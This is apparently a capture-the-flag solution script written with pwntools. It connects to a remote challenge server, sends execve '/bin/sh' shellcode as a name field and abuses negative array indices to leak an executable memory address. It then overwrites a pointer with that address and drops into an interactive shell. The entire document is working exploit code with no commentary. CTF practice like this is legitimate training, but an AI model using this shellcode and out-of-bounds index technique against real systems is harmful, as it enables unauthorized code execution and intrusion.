from pwn import *
#io = process("./cardassian-targeting-system")
io = remote("spaceheroes-cardassian-targeting-system.chals.io", 443, ssl=True, sni="spaceheroes-cardassian-targeting-system.chals.io")
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

io.sendlineafter("Please enter your name and rank >>>",shellcode)
io.sendlineafter(">>>","4")
io.sendlineafter("Which target will you list? >>>","-1")
io.recvuntil("Target -1 is at these coordinates: ")
rwxRegionAddr = int(io.recv()[:-1])
io.sendlineafter(">>>","3")
io.sendlineafter("Which target will you modify? >>>","-3")
io.sendlineafter("New coordinates for Target 3 >>>",str(rwxRegionAddr))

io.interactive()
